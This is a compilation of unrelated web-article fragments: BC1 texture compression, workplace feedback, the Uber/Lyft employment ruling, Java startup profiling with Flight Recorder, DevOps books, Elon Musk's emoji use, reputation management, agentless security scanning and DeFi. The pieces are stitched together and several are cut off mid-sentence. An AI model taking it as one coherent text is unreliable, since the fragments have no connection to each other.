<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/s3tc.comp</a></p>
<p><a href="https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h">https://github.com/Themaister/Granite/blob/master/assets/shaders/decode/rgtc.h</a></p>
<h3>BC1 – 4×4 – 64 bits</h3>
<p>The BC1 format is extremely simple and a good starting point. 32 bits is used to encode two RGB endpoints in RGB565 format. The other 32 bits encode 16 weights, with 2 bits allocated to each texel.</p>
<p>This lets us represent interpolation weights of 0, 1/3, 2/3 and 1.</p>
<p>Since there is a symmetry in this design, i.e.:</p>
<pre>mix(a, b, l) == mix(b, a, 1.0 - l)</pre>
<p>there would be two ways to specify the same block, where we swap endpoints and invert the weights to compensate. This is an extra bit of information we can exploit. Based on the integer representation of the two endpoints, we can check if one of greater than the other, and use a different decoding mode based on that information. This exploitation of symmetry will pop up again in many formats later! In the secondary mode, we add support for 1-bit …</p></div></article></div>

<p>I am terrified of awkwardness. I know nobody likes an awkward moment, but for me it’s downright crippling. I’ve walked out of the room during awkward moments on TV shows. I once faked internet issues to get out of an uncomfortable work call. I’m a huge fan of the Irish goodbye, because dealing with the not-sure-if-we-should-hug thing sucks. It’s been a serious problem in my life.</p>



<p>And wouldn’t you know it – I also hate giving people news that might upset them. Because that’s often pretty dang awkward. I’ve gotten good at figuring out ways to avoid it without feeling like I avoided it. For example:</p>



<ul><li>I’ve given negative feedback about something really tiny and specific in hopes that it would solve the bigger, much more critical problem, because talking about the critical problem may have been awkward. Spoiler: it never worked.</li><li>I’ve flat out avoided giving negative feedback because “they’re already dealing with a lot” or “I’m going to wait until I have a better example to use, or else it wouldn’t be fair to them” or who knows how many other reasons.</li><li>I’ve given negative feedback that really came from me, but I pitched it like “I don’t think this, but I’m wondering if &lt;a coworker&gt; may think it, from their point of view.”</li></ul>



<p>In that way, I convince my monkey brain that I’m being caring because I’m still “delivering feedback” just without the hurt feelings, right? But no, I’m being a jerk, because <a href="https://brenebrown.com/blog/2018/10/15/clear-is-kind-unclear-is-unkind/">clear is kind, and unclear is unkind</a>. </p>



<p>I don’t know where this first came from, but I heard it from Brené Brown and it was a smack in the face. If I’m not being clear, then I’m being unkind. Period. No matter how much I can try to convince myself that it’s not that simple, it really is.</p>



<p>I am changed. With this as my guiding principle, I feel confident in giving tough feedback no matter how awkward it might be, because anything else would be unkind. And even though I hate awkwardness, I hate being unkind even more.</p>

<p>As I briefly covered <a href="https://axisofeasy.com/aoe/axisofeasy-158-hundreds-of-smartphone-apps-sell-your-location-data-to-government-connected-data-firms/">in my AxisOfEasy tech digest</a> this week, Uber and Lyft were bracing themselves for a ruling by a California judge that threatened to force them into treating their <span>wage slaves</span> drivers as employees. Lyft said if the ruling went against them it would cause “irreparable damage”. Uber CEO Dara Khosrowshahi penned an <a href="https://www.nytimes.com/2020/08/10/opinion/uber-ceo-dara-khosrowshahi-gig-workers-deserve-better.html">op-ed in the New York Times</a> that just so happened to run Monday, pining for a fair shake for gig economy <span>serfs</span> workers.<span id="more-1152"></span></p>
<p>Khosrowshahi, whose compensation package last year clocked in at $45,000,000 USD, waxed pensively,<em> ‘There has to be a “third way” for gig workers.’ .&nbsp;</em>Ideally one in which Uber wouldn’t be on the hook for their benefits and would be able to continue apace as a Silicon Valley unicorn: posting billions of dollars a quarter in losses and <a href="https://www.forbes.com/sites/janetwburns/2020/03/26/uber-and-airbnb-ask-for-bailouts-critics-arent-having-it/#2a5d61ff7639">jockeying for Federal bailouts.</a> Meanwhile the early stage backers, the VC’s and the private equity funds, would continue to live large off of financialization, not having to worry about the consequences of being <em>the&nbsp;</em>driving force in a race to the bottom for everybody else (even Uber’s lümpenvestors who bought into the IPO are still underwater).</p>
<p>As it turned out, <a href="https://www.theverge.com/2020/8/10/21362460/uber-lyft-drivers-employees-california-court-ruling">Judge Schulman ruled</a> that these gig economy workers are to be treated as employees in the State of California, and sure enough, Uber is now <a href="https://ktla.com/news/california/uber-lyft-threaten-to-leave-california-if-court-upholds-ruling-forcing-them-to-treat-drivers-as-employees/">threatening to pick up their ball and go home.</a></p>
<p>People following my writings may be surprised that I’m not approaching this as yet another government inflicted wound against capitalism, like how laws mandating higher minimum wages actually increase unemployment. It’s a fair point.</p>
<p>But we’re not talking about countless mom-and-pops and other main street businesses having their costs jacked up by economically illiterate career politicians. Even in a climate of government mis-micromanagement and overreach, the so called “free enterprise” participants should be competing under the same conditions. If an independently owned and operated driver service in the state has to operate under onerous taxation and terms, then being a Silicon Valley unicorn shouldn’t exempt you from suffering the same conditions.</p>
<p>In this case we’re talking <a href="https://outofthecave.io/articles/wait-why-is-the-fed-buying-my-biggest-competitors-bonds/">about Cantillonaires</a> who feel entitled to special privileges and exemptions but the reality is this:</p>
<h3>These companies were never intended to be economically viable.</h3>
<p><em>Uber and Lyft started the year with $11.3B and $2.8B in cash on their balance sheets respectively. They posted TTM losses of $10B and$ 2B respectively.&nbsp; They are valued around $54B and $9.2B</em></p>
<p>The only thing that mattered from the outset was to cannibilize the entire market, driving down prices and wages while operating at a loss so that they could garner the next financial event, be it a series D, E or F up-round and then eventually some monster acquisition or IPO. Within truly un-manipulated, free market competition, Uber and Lyft would have either had to compete, <em>viably</em>, with numerous entrants and competitors all fighting under their own steam, or else be snuffed out by economic reality.</p>
<p>The truth is that you can’t actually build a business where every transaction and input is subsidized, ultimately by central bank stimulus, while&nbsp; all normal course responsibilities of operations, like expenses, are externalized.</p>
<p>With the Everything Bubble <a href="https://outofthecave.io/articles/unicorn-winter/">finally looking to pop</a>, and pent up reality s-l-o-w-l-y <a href="https://outofthecave.io/articles/the-jackpot-chronicles-scenario-1-force-majeure/">beginning to reassert itself</a>, these Unicorns will have to face the same situation that every other non-unicorn, non Silicon Valley funded business has to face: Whatever your “boil-the-ocean” big idea is, you’re gonna have to do it in an economically viable way, or it’s not going to happen.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>At some point we had an issue with application startup performance.
For a bit of context this app runs in a Kubernetes cluster, with k8s it’s possible
to define a <em>rollout policy</em> to avoid service disruption, that what we had, so there’s a
rollout, new pods (a pod is composed of the application container) get created,
new application are started, then Kubernetes has a mean to check when the application is
<strong>ready</strong>, it’s called the readiness probe. This probe can be a call to http endpoint or a script,
ours is an HTTP endpoint.</p>
<p>WHen the probe indicates the application is ready, the application starts receiving traffic,
from this moment latencies increased from 10-20 milliseconds to seconds.</p>
<p>Opening the recording JMC, it will start an automated analysis. Sometime it’s helpful
and warning should be looked at. In this case the issue was elsewhere.</p>
<p>To help in our case, I needed to go in the thread view, which as a <em>thread lanes</em>
which displays each thread as an horizontal bar, and JFR event are painted on the bar
at the time they happened and for how long. At the bottom there’s a the time axis.</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-0-thread-lanes.png" alt="startup 0 thread lanes">
</p>
<p>Thread Lanes</p>
</div>
<p>The first things that catch our eyes will be the vertical patterns, especially the one with
yellow and red around 12:51:15. Let’s zoom (you can select and right click, or use arrow keys.).</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-0-threads-lanes-closer.png" alt="startup 0 threads lanes closer">
</p>
<p>Zooming on the problematic</p>
</div>
<p>The vertical pattern is more precise, these vertical pattern indicates a <em>cross
threads phenomena</em>. And we can notice that all thread are not affected the same way.</p>
<p>The lanes in green at the top indicates these threads are progressing normally, nothing’s
wrong with them. However, if we go down there especially, the pattern materialize around
12:51:11.</p>
<p>Each color indicate some events:</p>
<div>
<ul>
<li>
<p>Gray ⇒ the thread does nothing, it’s parked</p>
</li>
<li>
<p>Small dark point ⇒ The park event, the thread was scheduled but was eventually parked</p>
</li>
<li>
<p>Red ⇒ In this case it’s a <em>blocked lock</em></p>
</li>
<li>
<p>Yellow ⇒ Here the yellow events that interests us are thread waiting on a lock</p>
</li>
</ul>
</div>
<p>I’m not well versed in describing colors, so know that there are other events that use
a slightly different tone / shade of red, yellow or else. Just click on the event
to see what’s going on.</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-1-threads-jedis-lock-event.png" alt="startup 1 threads jedis lock event">
</p>
<p>monitor blocked</p>
</div>
<p>The UI could be improved but going over the events shows a popup with its details,
for the Monitor Blocked event, there’s the duration this monitor was block, who held
this monitor before, and the monitor address in the heap.</p>
<p>This monitor was held for ~9s, that’s a big bottleneck !</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-1-threads-jedis-monitor-acquire-blocked.png" alt="startup 1 threads jedis monitor acquire blocked">
</p>
</div>
<p>In this case this application had ~200 thread competing for this lock in particular. And finding
the thread that acquired it is not automated, it’s a bit tedious, but in the end didn’t reveal
anything.</p>
<p>However, the Monitor Blocked event has another interesting element, the stacktrace. In the lower
pane of JMC, if the event is selected, we can see the stack trace where this event was emitted.</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-1-threads-jedis-monitor-blocked-stack.png" alt="startup 1 threads jedis monitor blocked stack">
</p>
<p>jedis classloading</p>
</div>
<p>Here that’s the JDK classloader. I would never have thought that the JDK code would cause ~9s
contention. But looking at the stacktrace, there <em>jedis</em> (a Redis client) connection pool involved.
Maybe the class have static initialization that does IO, maybe it’s the agent that runs in production
that introduces latencies during this specific classloading.</p>
<p>But all the threads starts working again around 12:51:22, and redis bottleneck is not anymore an issue
afterward. Let’s look at the story on the IO side, open the Socket IO view.</p>
<p>Identify which one is related to redis, either via IP or via port (Redis is <code>6379</code>).</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-1-socketio-redis-port.png" alt="startup 1 socketio redis port">
</p>
<p>Socket IO with redis port selected</p>
</div>
<p>While we see a total time of 30s, it’s the accumulated time for all thread for the recording duration (6m).
So nothing fancy here. However, we see that actual IO happens later, around 12:51:22.</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-1-socketio-redis.png" alt="startup 1 socketio redis">
</p>
<p>Socket IO actual Redis read / write</p>
</div>
<p>I’m not sure of the cause, we can definitely rule out Redis, the is either in the network, during
connection establishment, or actually during classloading.</p>
<p>In order to remediate that, we noticed this code is called once the application is ready.
So in order to avoid the contention the code was changed to pre-connect to redis during the
application startup before the application is considered ready. And it worked, this
specific issue disappeared.</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-2-thread-lanes.png" alt="startup 2 thread lanes">
</p>
</div>
<p>The issue identified in the first recording showed some contention on redis, this is now gone.
There is however in this second iteration multiple other issues when flying the mouse pointer
over the yellow and red events.</p>

<p>All the stacktraces above have one thing in common, a contention on a lock.
As thread were blocked, and new request appeared, this had the effects of increase the
queuing, and made tomcat creates new <em>http nio</em> worked threads until the maximum is reached
(200 by default). I applied the same trick: i.e before readiness, exercise code paths that
are lazy initialized. And it worked too. Most contention disappeared afterward.</p>

</p>
<p>Better startup / C2 compiler event</p>
</div>
<p>There was still some potential gain however. I noticed a few C2 compiler related events.
If you don’t know C1 and C2, those are the compilers that transform bytecode to assembly.
C1 interprets the bytecode and may perform some tricks like escape
analysis, but its role is to be fast to execute bytecode and not about optimizing the machine
code assembly. In a second phase C2 may kick in for hot code path that is code that is executed
very often, and its job is to output highly optimized code at the cost of higher computation
resources.</p>
<p>Note this compilation event <strong>is not</strong> blocking threads !</p>
<p>As an experiment I used the Graal compiler, which I believe is the new
generation of compiler that have a chance to replace C2. <a href="https://github.com/oracle/graal/blob/master/compiler/README.md">Graal compiler</a>
is part of the <a href="https://github.com/oracle/graal">GraalVM</a> project.
It ships as an experimental option : <code>-XX:+UnlockExperimentalVMOptions -XX:+UseJVMCICompiler</code>.</p>
<p>And the result for this work load in particular, just activating the Graal compiler between
these two successive rollouts.</p>

but the improvement is still visible.</p>
<p>After that experiment when I analyzed the new profile I noticed that JVM was using a lot of time to
revoke bias locking. Note the events in fushia are custom JFR events that track HTTP requests.
(<a href="https://twitter.com/gunnarmorling">Gunnar Morling</a> has an inspiring
<a href="https://www.morling.dev/blog/rest-api-monitoring-with-custom-jdk-flight-recorder-events/">write up</a> about it).</p>
<p>This VM operation is done during safepoint during which the JVM is paused. At this time a lot of
bias revocation event appears, so we removed them, and it works too.</p>

<p>Other smaller issues could be discovered and tackled, for example I noticed a few gaps
200ms wide at 30/1min intervals that were related to GC pauses.</p>
<div>
<p>GC gaps</p>
<p><span><img src="https://blog.arkey.fr/assets/jfr/startup-9-gc-pause-1.png" alt="startup 9 gc pause 1" title="GC gap 1"></span> <span><img src="https://blog.arkey.fr/assets/jfr/startup-9-gc-pause-2.png" alt="startup 9 gc pause 2" title="GC gap 2"></span></p>
</div>
<p>For this application the GC is working within 20ms excepts for a few larger pauses
during the early minutes of startup:</p>
<div>
<p><img src="https://blog.arkey.fr/assets/jfr/startup-9-thread-lanes-gc-pauses-effect.png" alt="startup 9 thread lanes gc pauses effect">
</p>
<p>GC pauses causes new HTTP worker threads</p>
</div>
<p>Tuning GC is out of scope for this article, but JMC presents a nice view that could help identify GC
causes. In my opinion it’s currently a bit less powerful as GC logs because GC events lack
useful information only found in GC logs with appropriate tags and level.</p>

</div>
<p>Anyway from there we could imagine a <em>setting</em> file in the JDK dedicated for GC events.
Instead of parsing log files whose <em>string format</em> that may change a bit over releases
(even with unified logging) GC events could be analyzed leveraging the included JFR schema.</p>
<p>Also, with JFR it’s even possible to record memory leak using the <code>profile</code> <em>settings</em> file,
I never tried that in a real situation though, but if this avoids the need to make a heap dump
and parse it then I’m all in.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><div>
<p>The future of DevOps solutions is bright. The <a href="https://www.marketsandmarkets.com/Market-Reports/devops-824.html" target="_blank" rel="noreferrer noopener">global DevOps market size</a> is expected to <strong>increase from $2.90 billion in 2017 to $10.31 billion by 2023</strong>, at a Compound Annual Growth Rate (CAGR) of 24.7% during the forecast period.&nbsp;</p>



<p>The growing need for fast app delivery is driving the market growth, with organizations that want to achieve both speed and quality.&nbsp;</p>



<p>However, the world is facing <a href="https://www.shuttleops.io/the-shortage-of-devops-skills" target="_blank" rel="noreferrer noopener">a shortage of DevOps skills</a>. That’s why DevOps engineers are highly-paid, with <a href="https://www.glassdoor.com/Salaries/devops-engineer-salary-SRCH_KO0,15.htm" target="_blank" rel="noreferrer noopener">Glassdoor estimating</a> <strong>the average annual pay at around $100,000</strong>.&nbsp;</p>



<p>So, if you’re looking for a career switch or upgrade, learning DevOps is a good idea. From books to podcasts, <em>here are the best DevOps resources to start with:&nbsp;</em></p>



<h2><strong><a rel="noreferrer noopener" href="https://www.bookdepository.com/Phoenix-Project-Gene-Kim/9781942788294?ref=grid-view&amp;qid=1588577029418&amp;sr=1-1" target="_blank">The Phoenix Project</a></strong></h2>



<p>Who would have thought you could write a novel about DevOps? Well, Gene Kim, Kevin Behr, and George Spafford obviously did a great job!&nbsp;</p>



<p><strong>The Phoenix Project </strong>is an amazing novel about DevOps. The story revolves around a fictional company called “Parts Unlimited”, where the IT manager gets promoted into a senior position. Then, he gets a deadline of 90 days to repair “The Phoenix Project”, a failing and messy code project that’s crucial to the future of the company. If he fails, the CEO threatens to outsource the entire IT department and let go of the people working in it.</p>



<p>So, he starts working on it with the help of some board members. The most important thing here is his philosophy called The Three Ways. It consists of (obviously) three parts—maximizing the flow of work from left-to-right, starting from business to development to IT operations to the end-user; increasing the feedback loop from right to left, and developing and nurturing a culture of <a href="https://microtica.com/cracking-the-continuous-deployment-code/" target="_blank" rel="noreferrer noopener">continuous deployment</a> and learning.</p>



<p>This philosophy helps him create <strong>a streamlined workflow in the department</strong>, <a href="https://microtica.com/6-tips-to-solve-miscommunication-in-dev-teams/">improve </a><strong><a href="https://microtica.com/6-tips-to-solve-miscommunication-in-dev-teams/" target="_blank" rel="noreferrer noopener">communication</a> and effectiveness</strong>, and make the IT department really valuable to the company.&nbsp;</p>



<p>I think this is a really great book, especially for beginners. It gives a sense of what problems IT departments face every day, and offers realistic solutions.&nbsp;</p>



<h2><strong><a rel="noreferrer noopener" href="https://www.oreilly.com/library/view/infrastructure-as-code/9781491924334/" target="_blank">Infrastructure as Code</a></strong></h2>



<p>Coming from ThoughtWorks, this is another book that focuses on <strong>the entire DevOps movement from a more technical aspect</strong>. This book covers the principles of Infrastructure as Code, practical examples, dynamic infrastructure platforms, various cloud options, tools, patterns, software engineering practices, <a href="https://microtica.com/how-to-create-simple-ci-cd-pipeline/" target="_blank" rel="noreferrer noopener">creation and management of pipelines</a>, workflows, and infrastructure management. They are all divided into three sections—Foundations, Patterns, and Practices.&nbsp;</p>

                            <div><p>I've conducted an analysis of 10,683 tweets, which were posted by Elon Musk between June 4th 2010 and August 2nd 2020. 622 of these tweets contained emojis.</p><h2>Elon's First Emoji</h2><p>Between 2010 and 2017, Elon Musk didn't use any emojis in his tweets, instead opting only for the emoticon "<strong>:)</strong>". He used an emoji for the first time in a tweet on the 4th of June 2017. The tweet was about his Mom and it contained the <a href="https://emojigraph.org/red-heart/">❤️Red Heart</a> emoji.</p>
<h2>📈 On The Rise</h2><p>In the second half of 2017, Elon slowly began to use more emojis in his tweets. In May 2018, he used 56 emojis throughout the month.</p><p><img alt="Elon Musk emoji count by months" height="355" src="https://emojigraph.org/media/images/Elon_Musk_emoji_usage_by_months.width-800.png" width="800"></p><p><em>Figure 1: Emoji count by months.</em></p><p>Following this, he became more active with his emoji usage, and his record sits at 98 emojis in one month, which he set only recently.</p><p><img alt="Elon Musk Total emoji count by days" height="459" src="https://emojigraph.org/media/images/Elon_Musk_Total_emoji_count_by_days.width-800.png" width="800"></p><p><em>Figure 2: Total emoji count by days.</em></p><p>Fast forward to August 2nd 2020, he'd used a total of 1,096 emojis in his tweets, with the number of unique emojis sitting at 172.</p><p>Of the 3,332 tweets he posted in the last 12 months, 311 of these tweets (9.33%) contained a total of 518 emojis.

Reputation is often associated with trust and/ or quality and it can be attributed to individuals, products, services, groups or organizations. To many, it serves as a determining factor when it comes to individual engagement and decision making. Many organizations and individuals in competitive markets have realized the impact that reputation has on them, which led to greater expansions in reputation management. The practice aims to build, monitor and control the narrative surrounding one’s traits, values, professionalism/ quality and it can support their respective goals or interests.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Advances in globalization and technology, specially search engines and social media has led to the exponential growth in the importance and value of reputation management. Companies also benefit from vast data pools that are created once individuals go about their everyday online activities, which can serve as additional insight in the area. In this article, GPetrium will look at the types of reputation that may need management while applying business case scenarios that involve corporate and individual as examples.</p></div></div></div><div data-id="35a42c2d" data-element_type="widget" data-widget_type="heading.default"><p><h2>Types of Reputation to Manage</h2></p></div><div data-id="f3f8f8c" data-element_type="widget" data-widget_type="text-editor.default"><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; In today’s environment, reputation is built, maintained, controlled and monitored in a variety of different mediums and spectrums.

Failure to live to its perceived culture or to build a culture that at least partially aligns with its surroundings (societal values and morals) can lead to reputation loss which subsequently impacts expected outcomes. Most often, companies post about the values that guide their general behaviour in their website and report on them in an annual basis. As an example, </span><span><a href="https://www.coca-cola.ca/our-company">Coca Cola</a></span><span> openly commit to partaking on sustainable practices in their operations when the company is described.</span></p><p><span>&nbsp;</span><strong>Social Media Presence</strong><span> – Aims to engage with others in virtual communities and networks to grow one’s relationships and reputation. Social media presence may range from employment-oriented networks such as Linkedin to Twitter, Facebook, forums and many more. Online reputation management in social media has become a growing trend and different companies take different approaches. Some companies choose to maintain a strictly professional relationship in which they simply advertise some of their operations and initiatives on their page and reply to urgent matters when necessary, as </span><span><a href="https://www.linkedin.com/company/hydro-one/">Hydro One</a></span><span>’s LinkedIn page for instance. Other companies such as </span><span><a href="https://www.linkedin.com/company/mckinsey/">McKinsey &amp; Company</a></span><span>, use social networks as an opportunity to practice brand development to further segment their expertise. </span><span><a href="https://twitter.com/Wendys?ref_src=twsrc%5Egoogle%7Ctwcamp%5Eserp%7Ctwgr%5Eauthor">Wendy’s</a></span><span> on the other hand, generate publicity by humorous popular content which ensures that they are engaging with clients in different levels across different platforms.</span><br><span><br></span></p><p><span>&nbsp;</span><strong>Crisis Management</strong><span>– As time passes, moments of intense difficulty, trouble, or even danger are brought forth by internal and external factors which may require immediate attention and responses. The way an organization handles moments of crisis, not only during the difficult moments, but also in preparation to such moments and post-activities can heavily influence perception and impact individual or organizational reputation. For instance, Airbnb’s CEO and cofounder, Brian Chesky, published an </span><span><a href="https://news.airbnb.com/a-message-from-co-founder-and-ceo-brian-chesky/">open letter during the Covid-19 pandemic</a></span><span> detailing the reasons the company was laying-off 25% of its workforce. Despite the hard news, the letter was received as an example of how to handle crisis in a humane way that is respectful of the consequences such actions may have on their employees.</span><br><span><br></span></p><p><span>&nbsp;</span><strong>Customer Experience</strong><span> – Associated to the end-to-end experience that customers face, customer experience is present throughout the customer’s purchase cycle – from their journey of discovery to acquisition and utilization of said products or services. It can often spill over on other mediums in which reputation is also managed such as social media platforms which can result in positive or negative impacts depending on how well the customer experience was delivered. Notoriously, in 2017 an </span><span><a href="https://en.wikipedia.org/wiki/United_Express_Flight_3411_incident">employee from United Airlines forcibly removed a passenger out</a></span><span> of a flight because the plane was overbooked. The incident resulted on the customer being seriously injured and was recorded by other passengers. The incident negatively impacted the company’s reputation and the CEO had to issue a public apology the day following the incident.</span></p><p><span>&nbsp;</span><strong>Financial Reputation or Credit Score</strong><span> – As the saying goes “Cash is King”, this motto drives the importance of fiscal health to organizations and individuals. In most cases, failure to maintain a certain level of financial reputation can impact a financial institution’s perception of a borrower, limiting their ability to finance or leverage their activities. It can also, in some cases, impact value perception of stakeholders and relationships.</span><br><span><br></span></p><p><span>&nbsp;</span><strong>Supplier Relations</strong><span> – Anyone that is dependent on suppliers to deliver a product or service that supports their activity will oftentimes understand the importance of maintaining good supplier relations. Even in a B2B environment, words can travel fast, specially if it is associated with a poor business-customer experience such as late/ no delivery, failure to pay, among others. Managing said reputation can be detrimental to long-term success and growth.</span><br><span><br></span></p><p><span>&nbsp;</span><strong>Online Reputation System</strong><span> – Is a reputation system, mostly found in e-commerce, that aims to give buyers and sellers a tool to comment on each other in areas that the platform deems important in relation to the product/ service. The information disparity between consumer and seller has significantly shifted over the years thanks to online review systems. Several customers will often research a product online, or hear about it online before a purchase. Sometimes, the research might not even be on the platform in which the customer will finalize the purchase. That can happen when the review database of the website does not contain a lot of customer review, the data is considered untrustworthy or the user UI is not friendly.</span><br><span><br></span></p><p><span>&nbsp;</span><strong>Societal Culture</strong><span> – Every culture has a subset of traits and beliefs that drive their attitude and activities. For an organization to succeed, it is essential to consider its reputation as it pertains to the markets that it intends to service. Failure to do so can often lead to backlashes from customers and employees that may impact the bottom line in that specific market. Further, companies need to also to be aware of shifting priorities and beliefs in their demographics as failure to change may also negatively impact the company. For instance, </span><span><a href="https://www.nytimes.com/2018/11/16/style/victorias-secret-bras-decline.html">in 2018 the brand Victoria’s Secret fell into hot waters with the public</a></span><span> for not having models with diverse shapes, colors, and sizes to model their clothing – which ignited body shaming complaints.</span><br><span><br></span></p><p><span>&nbsp;</span><strong>Legitimacy or Trustworthiness</strong><span> – Trust can be everything in relations and transactional deals. Failure to uphold the values and quality that others expect a brand to have can be detrimental to a brand’s reputation and sales may suffer. Famously</span><span><a href="https://www.cbsnews.com/news/30-years-ago-today-coca-cola-new-coke-failure/">, in 1985, Coca-Cola changed its beverage recipe</a></span><span>, customers soon came out with organized campaigns and petitions requesting that the classic Coke recipe be brought back into the market. which got customers so infuriated that they organize campaigns and petitions to bring the classic Coke recipe.</span></p></div></div></div><div data-id="610743cd" data-element_type="widget" data-widget_type="heading.default"><p><h2>Applications in Reputation Management</h2></p></div><div data-id="2a623dd" data-element_type="widget" data-widget_type="text-editor.default"><div><div><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Corporate Reputation Management is a continuous effort that organizations of all sizes have to contend to as they shape internal and external relations. When done right, stakeholder opinion may improve tremendously, driving increased revenue, recognition and other accolades. This segment will look at a few key examples of reputation management as it relates to the types talked about above.</p><p><strong>Organizational culture</strong><span> – Imagine an organization that proclaims in public to embody values of being innovative, people oriented and believes in equal pay for equal work. However, information comes out that its gender pay gap is a staggering 30% difference, employees have been poorly managed and it shows on the quality of service provided. Such factors are all compounded by the consistent lack of innovation in relation to peers in the industry. It is to be expected that in a highly competitive market, a company’s reputation could be severely impacted from a customer, employee and prospective stakeholders’ perspective.</span></p><p><strong>Social Media Presence</strong> – Users have come in droves on social media to complain about a product that company XYZK Ltd put on the market. XYZK never had any social media presence and customer support was not enough to pick-up the trend until a month later when major department stores began taking their products off the shelves and revenue suffered a dip. The issue arrives at the CEO’s desk and he requests the company to resolve the matter. The company is now a month late to the game, with limited to no expertise in social media management as it attempts to recuperate from its failure. On the other hand, it may mishandle its social media presence, leading to further reputational loss and even run the risk of getting swiped away in the <span><a href="https://www.dictionary.com/e/pop-culture/cancel-culture/">cancel culture</a></span><span> phenomenon</span>.</p><p><span>Social media gives organizations an opportunity to reach out to its stakeholders in a less formal environment, allowing it to build goodwill and presence. Internet use has grown exponentially throughout the years, with estimates showing a change of 1.36 billion in 2010 to 3.73 billion users in 2016 (</span><span><a href="https://data.worldbank.org/indicator/SP.POP.TOTL">Worldbank 1</a></span><span>, </span><span><a href="https://data.worldbank.org/indicator/it.net.user.zs">2</a></span><span>)</span><span> and social media use has accompanied this rapid expansion (</span><span><a href="https://ourworldindata.org/internet">OurWorldinData</a></span><span>).

</p><p data-renderer-start-pos="518">Agentless Scanning Solution Architecture</p><p data-renderer-start-pos="706">Because an agentless scanning solution needs to perform <span id="6f2df3fa-8266-4a6a-b991-bf79b110a44e" data-renderer-mark="true" data-mark-type="annotation" data-mark-annotation-type="inlineComment" data-id="6f2df3fa-8266-4a6a-b991-bf79b110a44e">outbound</span> network connections to all of its targets, including SSH connections for authenticated scans, the solution works best in a centralized-hub-and-spoke Virtual Private Cloud (VPC) architecture. In this architecture, one centralized ‘hub’ VPC is peered with multiple ‘spoke’ VPCs, with each of these spoke VPCs typically representing an environment for a user-facing service. Often, the centralized hub VPC contains services used by the organization for internal uses. For example: scanning software, a VPN server, an artifact repository, a CI/CD system, etc.</p><p data-renderer-start-pos="1328">However, not all organizations make use of a centralized-hub-and-spoke architecture. For example, picture the following organization’s overall infrastructure:</p><ul><li><p data-renderer-start-pos="1490">Four unpeered VPCs, each representing an environment for an AWS Elastic Kubernetes Service (EKS) cluster with four self-managed EKS worker nodes, which will run the organization’s user-facing services.</p></li><li><p data-renderer-start-pos="1695">CircleCI as the CI/CD system to build Docker images to run on the EKS clusters.</p></li><li><p data-renderer-start-pos="1778">AWS Elastic Container Registry as the Docker Registry for the aforementioned images.</p></li><li><p data-renderer-start-pos="1866">AWS Systems Manager (SSM) Agent running on the EKS worker nodes, for remote access directly from the AWS console (no need for a VPN server).</p></li><li><p data-renderer-start-pos="2010">GitHub as the VCS provider for the organization.</p></li></ul><p data-renderer-start-pos="2062">In this case, a centralized VPC would have nothing to host! However, this does not change the fact that the organization may need to undergo a SOC2 audit. In this case, a couple of their audit deliverables may be to create organizational procedures for periodic scans of their assets (the self-managed EKS worker nodes), and also a report of their assets run against a CIS level 2 benchmark and the resulting list of security objectives that need to be rectified.</p><p data-renderer-start-pos="2527">In order to create these deliverables, the organization needs a scanning software, especially one featuring predefined controls, such as the CIS level 2 benchmark for Amazon Linux 2 – which corresponds to the base Linux distribution of the EKS worker nodes.

<p>This post explores what is the concept of Decentralized Finance (DeFi), what new possibilities does it unlock and why it’s so cool and hot right now. On the other side of the coin it touches on the dark side of DeFi with the YOLO farming and unaudited contracts most recently highlighted by the YAM fiasco. Finally it takes a look on the road ahead, the lessons that the community needs to learn in order to create sustainable and responsible DeFi for decades to come. Finacial instruments and tools that will not only be used by a few Twitter bros but permisionlessly by everyone around the world.</p>



<p>In one sentence, decentralized finance is the permissionless decentralized version of various traditional financial instruments such as exchanges, lending, borrowing, synthetic assets e.t.c. There has been a lot of innovation in the sector in the past 2 years.</p>

<h2 id="decentralized-exchanges">Decentralized Exchanges</h2>

<p>We have various decentralized exchanges such as:</p>

<ul>
  <li><a href="https://uniswap.org/">Uniswap</a></li>
  <li><a href="https://kyberswap.com/swap">Kyber</a></li>
  <li><a href="https://www.deversifi.com/">Deversifi</a></li>
</ul>

<p>They all operate in a decentralized way and are non-custodial in stark contrast with centralized exchanges such as Binance, Kraken to which you have to first deposit and give custody of your funds.</p>

<h2 id="lendingborrowing-protocols">Lending/Borrowing Protocols</h2>

<p>There are protocols such as <a href="https://app.compound.finance/">Compound</a> and <a href="https://app.aave.com/home">Aave</a> that allow users to lend their assets to earn interest or to borrow assets after staking some collateral. MakerDAO also offers a form of borrowing via <a href="https://oasis.app/borrow">vaults</a> that can mint the DAI stable token after depositing various forms of collateral.</p>

<h2 id="synthetic-assets">Synthetic Assets</h2>

<p>Synthetic asset protocols such as <a href="https://www.synthetix.io/">Synthetix</a> or <a href="https://www.tokensets.com/">Token Sets</a> combine a mix of different assets into a single asset. This way you can get exposure to multiple different assets by just holding a single synthetic asset.</p>



<p>What DeFi does is nothing new. All of this already exist in one form or another in the world of “traditional finance”. What is so amazing and revolutionary about DeFi is that it’s completely decentralized and permissionless. And that it is accessible to everyone regardless of location or background. It’s unlocking a ton of possibilities for people around the world, building a new permisionless financial system in the process.</p>



<p>Just like with everything involving money this sector also attracts short-termed myopic people and projects who are driven by greed.</p>

